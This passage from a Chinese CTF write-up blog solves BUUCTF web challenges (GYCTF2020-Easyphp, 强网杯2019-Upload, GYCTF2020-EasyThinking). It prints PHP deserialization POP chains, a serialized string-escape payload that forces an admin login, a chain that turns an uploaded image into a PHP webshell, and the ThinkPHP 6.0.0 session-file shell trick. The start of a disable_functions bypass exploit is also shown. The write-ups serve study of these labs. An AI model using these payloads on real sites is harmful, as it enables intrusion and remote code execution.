class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Info: call</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以调一个login方法，login有两个，一个是数据层的一个是用户类的</p><p>更底层的数据操作的sql语句是我们可以控制的，我们可以控制一个<strong>恒对</strong>的语句返回true的<code>id</code>结果集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1,2;</span><br><span class="line">_ _ _ _ _ _ _ _</span><br><span class="line">|id|password |</span><br><span class="line">|1|2        |</span><br></pre></td></tr></table></figure><p>由于密码是md5的验证</p><p>我们可以控制password为1：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=?</span><br></pre></td></tr></table></figure><p>或者控制token为admin即可</p><p>pop：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="string">&quot;select 1,\&quot;c4ca4238a0b923820dcc509a6f75849b\&quot; from user where username=?&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> UpdateHelper();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>获取序列化对象处：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原本的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age&#x3D;1&amp;nickname&#x3D;1</span><br><span class="line"></span><br><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;1&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>在nickname处构建逃逸</p><p>对象数据放在<code>CtrlCase</code>中</p><p><img src="/images/GYCTF2020-Easyphp/image-20210828000602366.png" alt="image-20210828000602366"></p><p>符合构建标准后，多余字符被废弃</p><p>构建 payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age&#x3D;1&amp;nickname&#x3D;****************************************************unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;;&#125;</span><br></pre></td></tr></table></figure><p>回显后，登录<code>admin</code>账号</p><p>index：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;lib.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.$_GET[<span class="string">&#x27;action&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>session已设置，直接转到updata包含读取flag：</p><img src="/images/GYCTF2020-Easyphp/image-20210827234558705.png" alt="image-20210827234558705" style="zoom:80%;">]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;文件泄露、代码审计、反序列化&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>强网杯-2019-Upload</title>
    <link href="http://example.com/2021/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/"/>
    <id>http://example.com/2021/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/</id>
    <published>2021-08-26T13:04:24.781Z</published>
    <updated>2021-08-29T11:30:32.815Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>代码审计、文件上传、反序列化、文件泄露</p><a id="more"></a></blockquote><div class="toc"><!-- toc --><ul><li><a href="#%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2">文件泄露</a></li><li><a href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a></li><li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a></li></ul><!-- tocstop --></div><br><p>首先是注册与登录，登陆后，每个账户可以上传一张头像。</p><p>存在upload文件夹，可以看到，头像文件被重命名且拼接解析为<code>.png</code></p><h4><span id="文件泄露">文件泄露</span></h4><p>鉴于目前的情况……比较困难，对字典、线程、间隔时间的设置有较高的要求……</p><p>尝试好多搭配，成功两次，挺玄妙的……</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/image-20210826211255110.png" alt="image-20210826211255110"></p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/image-20210826211301886.png" alt="image-20210826211301886"></p><h4><span id="代码审计">代码审计</span></h4><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/image-20210826211351430.png" alt="image-20210826211351430"></p><p>mvc</p><p>抓包测试时，cookie 中有一个 user。base64后的序列化数据</p><p>这个序列化是用来检查登录状态的：</p><p>index.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">&#x27;user&#x27;</span>)-&gt;where(<span class="string">&quot;ID&quot;</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过这个反序列化点构造攻击</p><h4><span id="文件上传">文件上传</span></h4><p>再来看看个人信息的头像上传：</p><p>profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">&quot;http://&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>].$_SERVER[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于参数可控，可以通过控制参数绕过文件名拼接，借助<code>copy</code>将我们绕过上传的图片shell更改为php解析</p><p>构建pop链需要入口</p><h4><span id="反序列化">反序列化</span></h4><p>web应用中的魔法方法：</p><img src="/images/强网杯-2019-Upload/image-20210826232551939.png" alt="image-20210826232551939" style="zoom:80%;"><p>只有destruct可用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用index方法，可以call</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动态调用函数，如果可以控制<code>name</code>，就可以调用文件上传</p><p>上面就有一个符合条件的get</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所有可控</p><p>pop：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Profile</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checker</span>;</span><br><span class="line">        <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">        <span class="keyword">public</span> $filename;</span><br><span class="line">        <span class="keyword">public</span> $upload_menu;</span><br><span class="line">        <span class="keyword">public</span> $ext;</span><br><span class="line">        <span class="keyword">public</span> $img;</span><br><span class="line">        <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;except[<span class="string">&#x27;index&#x27;</span>] = <span class="string">&#x27;upload_img&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp = <span class="string">&#x27;../public/upload/b78934111bc6a120a7957cbc2e531338/6e6a7627c6f6e9e3a95e30d1de17d47c.png&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;../public/upload/b78934111bc6a120a7957cbc2e531338/shell.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $checker;</span><br><span class="line">        <span class="keyword">public</span> $registed;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a =<span class="keyword">new</span> Register();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>登录时将序列化数据写入cookie</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/image-20210826233218385.png" alt="image-20210826233218385"></p><p>连接后在根目录找到flag</p><p>参考文章:<br><a href="https://blog.csdn.net/qq_41891666/article/details/107382969">参考链接</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;代码审计、文件上传、反序列化、文件泄露&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>GYCTF2020-EasyThinking</title>
    <link href="http://example.com/2021/08/25/GYCTF2020-EasyThinking/"/>
    <id>http://example.com/2021/08/25/GYCTF2020-EasyThinking/</id>
    <published>2021-08-25T07:43:46.074Z</published>
    <updated>2021-08-27T16:15:41.136Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>ThinkPHP6.0.0 任意文件操作漏洞 + disable 绕过</p><a id="more"></a></blockquote><p>EasyThinking……应该是thinkphp</p><p>有登录和搜索功能，有 session 功能</p><p>抓包测试发现同一个账户，cookie不同，搜索记录也不同</p><p>搜索记录写到了对应的文件中</p><h4><span id="shell">shell</span></h4><p>页面报错为：</p><blockquote><p><a href="http://www.thinkphp.cn/">ThinkPHP</a> V6.0.0 { 十年磨一剑-为API开发设计的高性能框架 } - <a href="https://www.kancloud.cn/manual/thinkphp6_0/">官方手册</a></p></blockquote><p>找相关的漏洞……</p><p><a href="https://blog.csdn.net/zhangchensong168/article/details/104106869">ThinkPHP6任意文件操作漏洞分析</a></p><p><a href="https://www.php.cn/phpkj/thinkphp/441728.html">ThinkPHP6 任意文件操作漏洞分析</a></p><p>通过控制32位的sessionid，拼接生成php文件。</p><p>再通过搜索功能写入一句话，访问<code>\runtime\sessionsess_sessid    </code>获得shell</p><img src="/images/GYCTF2020-EasyThinking/image-20210825155732941.png" alt="image-20210825155732941" style="zoom:67%;"><img src="/images/GYCTF2020-EasyThinking/image-20210825155750857.png" alt="image-20210825155750857" style="zoom:80%;"><h4><span id="diable">diable</span></h4><p>拿到shell后，无权限，蚁剑自带的插件也无法绕过</p><p>目标是运行根目录下的 <code>readflag</code> 获取flag</p><p><a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">PHP7.0-7.4版本的突破disable_function的exp</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span 